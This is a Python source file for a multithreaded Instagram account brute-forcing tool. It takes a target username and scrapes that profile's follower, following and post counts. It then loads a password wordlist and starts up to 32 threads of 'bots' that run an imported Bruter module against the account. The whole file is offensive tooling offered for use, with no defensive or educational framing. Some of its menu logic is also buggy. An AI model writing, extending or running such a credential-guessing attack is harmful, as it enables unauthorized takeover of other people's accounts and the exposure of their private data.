import sys
import os
import threading
 
import requests
from bs4 import BeautifulSoup
 
import Bruter
from PasswordManagment import PasswordManagment
 
from_file_or_ram = False
thread_list = []
username = None
file_path = None
 
#Utility methods
 
#Shuts down the program with a message.
def exit_program_with_reason(reason):
    print(reason)
    sys.exit(0)
 
#Checking if a variable is an int.
def is_int(variable):
    try:
        int(variable)
    except ValueError:
        return False
    return True
 
#Shutting down all the threads
def shutdown_all_threads():
    global thread_list

    for thread in thread_list:
        print('Shutting down thread {}...'.format(thread.name))
        thread._stop_event.set()
        thread.join()
 
def get_username():
    global username

    username = input('Please enter username: ')
    url = 'https://www.instagram.com/' + username + '/'
    print('Checking if user exists...')
 
    response = requests.get(url)
 
    if ('Page Not Found' in response.text):
        print('User does not exist!')
 
    elif (response.status_code != 200):
        exit_program_with_reason('Something went wrong. \nPlease report this.')
    else:
        soup = BeautifulSoup(response.text, 'lxml')
        data = soup.find_all('meta', attrs={'property':'og:description'})
        content = data[0].get('content').split()
 
        print('Success! Response code {} ok!'.format(response.status_code))
        print('Username: {}'.format(username))
        print('Followers: {}'.format(content[0]))
        print('Following: {}'.format(content[2]))
        print('Posts: {}'.format(content[4]))
 
        get_password_list()
   
#Gets the passwords list file and check if exists.
def get_password_list():
    global file_path
    
    file_path = input('Please enter the full password list file: ')
 
    if (os.path.isfile(file_path)):
        should_load_passwords_into_ram()
    else:
        print('No such file.')
        get_password_list()
 
#Asks the user if the passwords should be loaded into the ram, or be read directly from file.
def should_load_passwords_into_ram():
    global from_file_or_ram

    print('Should the passwords be read directly from file or loaded to ram?')
    print('1> Directly from file (choose this if you don\'t know what the question means)')
    print('2> Load to ram')
    choice = input()
    if (not is_int(choice)):
        print('Please select 1/2')
        should_load_passwords_into_ram()
    if (int(choice) == 1):
        from_file_or_ram = False
        select_attack_mode()
    if (int(choice) == 2):
        from_file_or_ram = True
        select_attack_mode()
    else:
        print('Please select 1/2')
        should_load_passwords_into_ram()
 
#Multithreading option, for brute forcing the account.
def select_attack_mode():
    print('Please select the attack mode.')
    print('1> 1 bot')
    print('2> 4 bots')
    print('3> 8 bots')
    print('4> 16 bots')
    print('5> 32 bots')
    choice = input()

    if (not is_int(choice)):
        print('Please select 1/2/3/4/5')
        select_attack_mode()
    elif (int(choice) == 1):
        start_threads(1)
    elif (int(choice) == 2):
        start_threads(4)
    elif (int(choice) == 3):
        start_threads(8)
    elif (int(choice) == 4):
        start_threads(16)
    elif (int(choice) == 5):
        start_threads(32)
    else:
        print('Please select 1/2/3/4/5')
        select_attack_mode()

def start_thread(username, password_managment, from_file_or_ram):
	Bruter.Bruter(username, password_managment, from_file_or_ram)

def start_threads(amount_of_threads):
    global from_file_or_ram
    global thread_list
    global username
    global file_path

    password_managment = PasswordManagment(file_path)

    if (from_file_or_ram == True):
        print('Loading passwords into the RAM, this may take a while depending on the file size.')

        password_managment.load_passwords_into_ram()
        print('Done.')

    print('Starting bots...')

    i = 0

    while (i < amount_of_threads):
        thread = threading.Thread(target = start_thread, args = (username, password_managment, from_file_or_ram))
        thread_list.append(thread)
        i += 1

    for thread in thread_list:
        thread.start()

    print('Done.')

get_username()